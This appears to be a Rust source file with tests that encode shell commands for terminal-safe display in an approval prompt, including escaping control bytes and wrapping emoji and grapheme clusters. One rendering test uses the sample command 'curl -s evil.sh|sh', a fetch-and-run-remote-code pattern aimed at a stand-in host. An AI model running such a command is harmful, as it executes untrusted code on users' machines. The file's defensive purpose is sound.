use std::borrow::Cow;

use ofx_text::{
    display_unit_at, encode_terminal_safe, escape_ambiguous_width, is_terminal_safe_char,
    starts_display_unit, trim_break_whitespace, visible_width, wrap_cut_ignoring_ansi,
};

const ESCAPE_LEAD: char = '\\';
const UNIT_LOOKAHEAD_BYTES: usize = 64;

pub(crate) fn approval_text(raw: &[u8]) -> String {
    unambiguous(encode_terminal_safe(raw, usize::MAX).text)
}

pub(crate) fn approval_text_boundary(raw: &[u8], index: usize) -> bool {
    let Some(&byte) = raw.get(index) else {
        return index == raw.len();
    };
    if index == 0 || byte.is_ascii() {
        return true;
    }
    if (0x80..0xc0).contains(&byte) {
        return !inside_char(raw, index);
    }
    let Some(next) = leading_char(&raw[index..]) else {
        return true;
    };
    !is_terminal_safe_char(next) || starts_display_unit(shown_before(&raw[..index]), next)
}

pub(crate) fn approval_text_chunk_end(raw: &[u8], from: usize, min_len: usize) -> usize {
    let target = from + min_len;
    let probe_end = target + UNIT_LOOKAHEAD_BYTES;
    if probe_end >= raw.len() {
        return raw.len();
    }
    if let Some(end) = (target..probe_end).find(|index| approval_text_boundary(raw, *index)) {
        return end;
    }
    let start = (from..target)
        .rev()
        .find(|index| approval_text_boundary(raw, *index))
        .unwrap_or(from);
    let first_len = leading_char(&raw[start..]).map_or(1, char::len_utf8);
    let slice_end = (probe_end + UNIT_LOOKAHEAD_BYTES).min(raw.len());
    let shown = encode_terminal_safe(&raw[start..slice_end], usize::MAX).text;
    let first_shown = encode_terminal_safe(&raw[start..start + first_len], usize::MAX)
        .text
        .len();
    let mut index = 0;
    while index < shown.len() {
        index += display_unit_at(&shown, index).byte_len.max(1);
        if index < first_shown {
            continue;
        }
        let end = start + first_len + (index - first_shown);
        if end >= probe_end {
            break;
        }
        if end >= target {
            return end;
        }
    }
    raw.len()
}

fn inside_char(raw: &[u8], index: usize) -> bool {
    (1..=3.min(index)).any(|back| {
        let lead = index - back;
        !(0x80..0xc0).contains(&raw[lead])
            && leading_char(&raw[lead..]).is_some_and(|character| character.len_utf8() > back)
    })
}

fn shown_before(raw: &[u8]) -> char {
    trailing_char(raw)
        .filter(|previous| is_terminal_safe_char(*previous))
        .unwrap_or(ESCAPE_LEAD)
}

fn leading_char(raw: &[u8]) -> Option<char> {
    raw[..raw.len().min(4)]
        .utf8_chunks()
        .next()?
        .valid()
        .chars()
        .next()
}

fn trailing_char(raw: &[u8]) -> Option<char> {
    let start = raw.len().saturating_sub(4);
    raw[start..]
        .utf8_chunks()
        .last()
        .filter(|chunk| chunk.invalid().is_empty())
        .and_then(|chunk| chunk.valid().chars().next_back())
}

pub(crate) fn unambiguous(text: String) -> String {
    match escape_ambiguous_width(&text) {
        Cow::Borrowed(_) => text,
        Cow::Owned(escaped) => escaped,
    }
}

pub(crate) fn project_command_text(command: &str) -> String {
    let mut projected = String::with_capacity(command.len());
    for (index, line) in command.split('\n').enumerate() {
        if index > 0 {
            projected.push('\n');
        }
        projected.push_str(&approval_text(line.as_bytes()));
    }
    projected
}

pub(crate) fn command_segments(encoded: &str, content_width: usize) -> Option<Vec<&str>> {
    if encoded.is_empty() {
        return Some(vec![""]);
    }
    let mut segments = CommandSegments {
        remaining: encoded,
        content_width,
        trailing_empty_line: false,
    };
    let mut collected = Vec::new();
    while let Some(segment) = segments.next_segment().ok()? {
        collected.push(segment);
    }
    Some(collected)
}

struct TooNarrow;

struct CommandSegments<'a> {
    remaining: &'a str,
    content_width: usize,
    trailing_empty_line: bool,
}

impl<'a> CommandSegments<'a> {
    fn next_segment(&mut self) -> Result<Option<&'a str>, TooNarrow> {
        if self.remaining.is_empty() {
            if !self.trailing_empty_line {
                return Ok(None);
            }
            self.trailing_empty_line = false;
            return Ok(Some(""));
        }
        if self.content_width == 0 {
            return Err(TooNarrow);
        }
        let line_end = self.remaining.find('\n').unwrap_or(self.remaining.len());
        let line = &self.remaining[..line_end];
        if line.is_empty() {
            self.consume_hard_line(line_end);
            return Ok(Some(""));
        }
        let hard_cut = prefix_terminal_safe_by_width(line, self.content_width);
        if hard_cut.is_empty() {
            return Err(TooNarrow);
        }
        let segment = if hard_cut.len() < line.len() {
            let soft_cut = wrap_cut_ignoring_ansi(line, self.content_width);
            if !soft_cut.is_empty() && soft_cut.len() < hard_cut.len() {
                soft_cut
            } else {
                hard_cut
            }
        } else {
            hard_cut
        };
        if segment.len() == line.len() {
            self.consume_hard_line(line_end);
        } else {
            let untrimmed = &line[segment.len()..];
            let trimmed = trim_break_whitespace(untrimmed);
            self.remaining = &self.remaining[segment.len() + untrimmed.len() - trimmed.len()..];
        }
        Ok(Some(segment))
    }

    fn consume_hard_line(&mut self, line_end: usize) {
        if line_end == self.remaining.len() {
            self.remaining = "";
            return;
        }
        self.remaining = &self.remaining[line_end + 1..];
        self.trailing_empty_line = self.remaining.is_empty();
    }
}

pub(crate) fn prefix_terminal_safe_by_width(encoded: &str, max_width: usize) -> &str {
    let mut width = 0;
    let mut end = 0;
    while end < encoded.len() {
        let (token_len, token_width) = encoded_token(&encoded[end..]);
        if width + token_width > max_width {
            break;
        }
        width += token_width;
        end += token_len;
    }
    &encoded[..end]
}

pub(crate) fn encoded_token(encoded: &str) -> (usize, usize) {
    if let Some(len) = ascii_token_len(encoded.as_bytes()) {
        return (len, len);
    }
    let len = encoded_token_len(encoded);
    (len, visible_width(&encoded[..len]))
}

pub(crate) fn suffix_terminal_safe_by_width(encoded: &str, max_width: usize) -> &str {
    let mut width = visible_width(encoded);
    let mut start = 0;
    while start < encoded.len() && width > max_width {
        let token_end = start + encoded_token_len(&encoded[start..]);
        width = width.saturating_sub(visible_width(&encoded[start..token_end]));
        start = token_end;
    }
    &encoded[start..]
}

fn ascii_token_len(bytes: &[u8]) -> Option<usize> {
    let len = escape_len(bytes).max(1);
    let printable = bytes[..len].iter().all(|byte| (b' '..=b'~').contains(byte));
    (printable && bytes.get(len).is_none_or(u8::is_ascii)).then_some(len)
}

fn encoded_token_len(encoded: &str) -> usize {
    let escape = escape_len(encoded.as_bytes());
    let mut end = 0;
    while end < encoded.len() {
        end += display_unit_at(encoded, end).byte_len;
        if end >= escape {
            break;
        }
    }
    end
}

fn escape_len(bytes: &[u8]) -> usize {
    if bytes.len() >= 4
        && bytes[0] == b'\\'
        && bytes[1] == b'x'
        && bytes[2].is_ascii_hexdigit()
        && bytes[3].is_ascii_hexdigit()
    {
        return 4;
    }
    if bytes.len() >= 5 && bytes.starts_with(b"\\u{") {
        let mut saw_hex = false;
        for (index, byte) in bytes.iter().enumerate().take(12).skip(3) {
            if *byte == b'}' {
                if saw_hex {
                    return index + 1;
                }
                break;
            }
            if !byte.is_ascii_hexdigit() {
                break;
            }
            saw_hex = true;
        }
    }
    0
}

#[cfg(test)]
pub(crate) mod grapheme_fuzz {
    pub(crate) struct Xorshift(pub(crate) u64);

    impl Xorshift {
        pub(crate) fn below(&mut self, bound: usize) -> usize {
            self.0 ^= self.0 << 13;
            self.0 ^= self.0 >> 7;
            self.0 ^= self.0 << 17;
            usize::try_from(self.0 % u64::try_from(bound).unwrap_or(u64::MAX)).unwrap_or(0)
        }
    }

    const CLUSTERS: [&str; 46] = [
        "a",
        "-",
        "1",
        "\\x0",
        "\\x1",
        "\x01",
        "\x07",
        "\u{2764}",
        "\u{2764}\u{fe0f}",
        "\u{2764}\u{fe0e}",
        "\u{231a}\u{fe0e}",
        "1\u{fe0f}\u{20e3}",
        "#\u{20e3}",
        "*\u{fe0f}\u{20e3}",
        "\u{1f469}\u{200d}\u{1f4bb}",
        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}",
        "\u{1f44d}\u{1f3fd}",
        "\u{1f3fd}",
        "e\u{301}",
        "a\u{300}\u{316}",
        "\u{4e2d}",
        "\u{ff21}",
        "\u{1f1e6}\u{1f1fa}",
        "\u{1f1e6}",
        "\u{fe0f}",
        "\u{20e3}",
        "\u{200d}",
        "\u{1f3f4}\u{e0067}\u{e0062}\u{e0073}\u{e0063}\u{e0074}\u{e007f}",
        "\u{202e}",
        "\u{0627}\u{0644}",
        "1\u{fe0f}",
        "#\u{fe0f}",
        "\u{1f3fb}\u{1f3ff}",
        "\u{20ff}",
        "\u{1aff}",
        "\u{17a4}",
        "\u{302a}",
        "\u{3099}",
        "\u{16ff0}",
        "\u{1100}\u{1161}\u{11a8}",
        "\u{1f1e6}\u{1f1e6}",
        "\u{2065}",
        "\u{e0002}",
        "\u{fe0e}",
        "\u{a8ff}",
        "\u{1f600}\u{1f3fd}",
    ];

    pub(crate) fn random_clusters(seed: u64, count: usize) -> impl Iterator<Item = String> {
        let mut rng = Xorshift(seed);
        (0..count).map(move |_| {
            let len = rng.below(48);
            let mut text = String::new();
            for _ in 0..len {
                if rng.below(8) == 0 {
                    let scalar = u32::try_from(rng.below(0x11_0000)).unwrap_or(0);
                    text.extend(char::from_u32(scalar));
                } else {
                    text.push_str(CLUSTERS[rng.below(CLUSTERS.len())]);
                }
            }
            text
        })
    }
}

#[cfg(test)]
mod tests {
    use super::grapheme_fuzz::{Xorshift, random_clusters};
    use super::*;

    fn prefix_by_display_units(encoded: &str, max_width: usize) -> &str {
        let mut width = 0;
        let mut end = 0;
        while end < encoded.len() {
            let token_end = end + encoded_token_len(&encoded[end..]);
            let token_width = visible_width(&encoded[end..token_end]);
            if width + token_width > max_width {
                break;
            }
            width += token_width;
            end = token_end;
        }
        &encoded[..end]
    }

    fn raw_samples(seed: u64, count: usize) -> impl Iterator<Item = Vec<u8>> {
        const BYTES: [&[u8]; 6] = [b"\t", b"\x1b[2J", b"\xff", b"\xe4\xb8", b"\r\n", b"\\x41"];
        let mut rng = Xorshift(seed ^ 0x5bd1_e995);
        random_clusters(seed, count).map(move |text| {
            let mut raw = Vec::new();
            for character in text.chars() {
                if rng.below(4) == 0 {
                    raw.extend_from_slice(BYTES[rng.below(BYTES.len())]);
                }
                raw.extend_from_slice(character.encode_utf8(&mut [0; 4]).as_bytes());
            }
            raw
        })
    }

    #[test]
    fn approval_text_splits_at_every_boundary_into_the_text_of_the_whole() {
        for raw in raw_samples(0x0d1f_f00d, 6000) {
            let whole = approval_text(&raw);
            let boundaries: Vec<usize> = (0..=raw.len())
                .filter(|index| approval_text_boundary(&raw, *index))
                .collect();
            assert_eq!(boundaries.first(), Some(&0), "{raw:?}");
            assert_eq!(boundaries.last(), Some(&raw.len()), "{raw:?}");
            let pieces: String = boundaries
                .windows(2)
                .map(|pair| approval_text(&raw[pair[0]..pair[1]]))
                .collect();
            assert_eq!(pieces, whole, "{raw:?}");
        }
    }

    fn chunked(raw: &[u8], min_len: usize) -> (String, usize) {
        let mut text = String::new();
        let mut start = 0;
        let mut widest = 0;
        while start < raw.len() {
            let end = approval_text_chunk_end(raw, start, min_len);
            assert!(end > start, "{raw:?} {start}");
            widest = widest.max(end - start);
            text.push_str(&approval_text(&raw[start..end]));
            start = end;
        }
        (text, widest)
    }

    #[test]
    fn chunks_end_within_reach_of_their_length_and_join_into_the_whole_text() {
        const JOINERS: [&str; 9] = [
            "\u{1f1fa}\u{1f1f8}",
            "\u{1f1fa}",
            "\u{fe0f}",
            "\u{fe0e}",
            "\u{20e3}",
            "\u{1f3fd}",
            "\u{200d}",
            "\u{e0067}",
            "\u{1f469}",
        ];
        let mut rng = Xorshift(0x7a3d_19c5);
        for raw in raw_samples(0x1bad_cafe, 3000) {
            let mut raw = raw;
            for _ in 0..rng.below(4) {
                let joiner = JOINERS[rng.below(JOINERS.len())];
                let at = rng.below(raw.len() + 1);
                let run = joiner.repeat(1 + rng.below(40));
                raw.splice(at..at, run.bytes());
            }
            for min_len in [1, 5, 33] {
                let (text, widest) = chunked(&raw, min_len);
                assert_eq!(text, approval_text(&raw), "{raw:?} {min_len}");
                assert!(widest <= min_len + 64, "{raw:?} {min_len} {widest}");
            }
        }
    }

    #[test]
    fn runs_of_flags_and_selectors_still_end_their_chunks_near_the_length() {
        for run in [
            "\u{1f1fa}\u{1f1f8}".repeat(20_000),
            "\u{fe0f}".repeat(30_000),
            format!("x{}", "\u{1f3fd}".repeat(20_000)),
            format!("\t{}", "\u{1f1fa}".repeat(20_001)),
        ] {
            let (text, widest) = chunked(run.as_bytes(), 4096);
            assert!(widest <= 4096 + 64, "{widest}");
            assert_eq!(text, approval_text(run.as_bytes()));
        }
    }

    #[test]
    fn plain_and_wide_text_has_a_boundary_before_every_character() {
        let text = "a\tb \u{4e2d}\u{6587} \u{1f600}\u{301}x";
        for (index, _) in text.char_indices() {
            assert!(approval_text_boundary(text.as_bytes(), index), "{index}");
        }
        let joined = [
            "\u{1f469}\u{200d}\u{1f4bb}1\u{fe0f}\u{20e3}".as_bytes(),
            b"\xff",
            "\u{fe0f}".as_bytes(),
        ]
        .concat();
        for (index, boundary) in [
            (4, true),
            (7, true),
            (11, true),
            (12, false),
            (15, false),
            (18, true),
            (19, false),
        ] {
            assert_eq!(approval_text_boundary(&joined, index), boundary, "{index}");
        }
        assert!(!approval_text_boundary("\u{4e2d}".as_bytes(), 1));
    }

    #[test]
    fn ascii_tokens_are_measured_as_their_display_units() {
        for raw in random_clusters(0x00a5_c11f, 3000) {
            for encoded in [approval_text(raw.as_bytes()), raw.clone()] {
                for width in [0, 1, 3, 4, 5, 9, 17, 64] {
                    assert_eq!(
                        prefix_terminal_safe_by_width(&encoded, width),
                        prefix_by_display_units(&encoded, width),
                        "{encoded:?} {width}"
                    );
                }
            }
        }
    }

    #[test]
    fn approval_command_projection_keeps_literal_escapes_and_encodes_controls() {
        assert_eq!(
            project_command_text("printf '\\x0a'\nprintf '\x1b[31m'\r"),
            "printf '\\x0a'\nprintf '\\x1b[31m'\\x0d"
        );
    }

    #[test]
    fn command_segments_retain_empty_hard_lines() {
        assert_eq!(
            command_segments("one\n\nthree\n", 80).unwrap(),
            ["one", "", "three", ""]
        );
    }

    #[test]
    fn inline_command_panel_wraps_commands_at_word_boundaries() {
        let width = 28 - visible_width("  $ ");
        assert_eq!(
            command_segments("curl --header alpha --header bravo", width).unwrap(),
            ["curl --header alpha", "--header bravo"]
        );
    }

    #[test]
    fn inline_command_panel_preserves_hard_newlines_from_the_raw_command() {
        let encoded = project_command_text("cat <<'EOF'\nline one\nEOF");
        assert_eq!(
            command_segments(&encoded, 116).unwrap(),
            ["cat <<'EOF'", "line one", "EOF"]
        );
        assert!(!encoded.contains("\\x0a"));
    }

    #[test]
    fn inline_command_rows_account_for_terminal_safe_escape_width() {
        let encoded = project_command_text(&format!("{}\n", "x".repeat(75)));
        assert_eq!(
            command_segments(&encoded, 80 - visible_width("  $ ")).unwrap(),
            [&"x".repeat(75), ""]
        );
    }

    #[test]
    fn encoded_controls_wrap_at_their_visible_width() {
        let encoded = project_command_text(&format!("{}\x07", "x".repeat(72)));
        assert_eq!(command_segments(&encoded, 76).unwrap().len(), 1);
        let encoded = project_command_text(&format!("{}\x07", "x".repeat(73)));
        assert_eq!(
            command_segments(&encoded, 76).unwrap(),
            [&"x".repeat(73), "\\x07"]
        );
    }

    #[test]
    fn segments_never_split_an_escape_and_report_commands_that_cannot_fit() {
        assert_eq!(prefix_terminal_safe_by_width("ab\\x1bcd", 4), "ab");
        assert_eq!(suffix_terminal_safe_by_width("ab\\x1bcd", 3), "cd");
        assert_eq!(
            suffix_terminal_safe_by_width("a\\u{202e}b", 9),
            "\\u{202e}b"
        );
        assert_eq!(command_segments("abc", 0), None);
        assert_eq!(command_segments("\\x1b", 3), None);
        assert_eq!(command_segments("", 0).unwrap(), [""]);
    }

    #[test]
    fn suffix_terminal_safe_by_width_preserves_escape_and_utf8_token_boundaries() {
        assert_eq!(
            suffix_terminal_safe_by_width("prefix/\\x1b/name.txt", "/name.txt".len()),
            "/name.txt"
        );
        assert_eq!(
            suffix_terminal_safe_by_width("prefix/\\u{0080}/name", "\\u{0080}/name".len()),
            "\\u{0080}/name"
        );
        assert_eq!(
            suffix_terminal_safe_by_width("prefix/\u{1f600}/x", 4),
            "\u{1f600}/x"
        );
    }

    #[test]
    fn prefix_terminal_safe_by_width_preserves_escape_and_utf8_token_boundaries() {
        assert_eq!(
            prefix_terminal_safe_by_width("prefix/\\x1b/name.txt", 11),
            "prefix/\\x1b"
        );
        assert_eq!(
            prefix_terminal_safe_by_width("\\u{0080}/name", 8),
            "\\u{0080}"
        );
        assert_eq!(
            prefix_terminal_safe_by_width("\u{1f600}/xyz", 4),
            "\u{1f600}/x"
        );
    }

    #[test]
    fn emoji_presentation_sequences_wrap_at_the_width_the_renderer_draws() {
        for glyph in [
            "\u{2764}\u{fe0f}",
            "1\u{fe0f}\u{20e3}",
            "\x01\u{fe0f}\u{20e3}",
        ] {
            let encoded =
                project_command_text(&format!("echo {};curl -s evil.sh|sh", glyph.repeat(40)));
            let segments = command_segments(&encoded, 76).unwrap();
            assert!(
                segments.iter().all(|segment| visible_width(segment) <= 76),
                "{segments:?}"
            );
            assert!(
                segments.last().unwrap().ends_with("evil.sh|sh"),
                "{segments:?}"
            );
            assert_eq!(segments.concat().replace(' ', ""), encoded.replace(' ', ""));
        }
    }

    #[test]
    fn wrapped_rows_fit_and_rejoin_for_any_grapheme_clusters() {
        let mut widths = Xorshift(0x2545_f491_4f6c_dd1d);
        for raw in random_clusters(0x9e37_79b9_7f4a_7c15, 20_000) {
            let encoded = project_command_text(&raw);
            let width = 1 + widths.below(32);
            let Some(segments) = command_segments(&encoded, width) else {
                assert!(width < 12, "{raw:?} {width}");
                continue;
            };
            for segment in &segments {
                assert!(
                    visible_width(segment) <= width,
                    "{raw:?} {width} {segment:?}"
                );
            }
            assert_eq!(segments.concat(), encoded, "{raw:?} {width}");
        }
    }
}
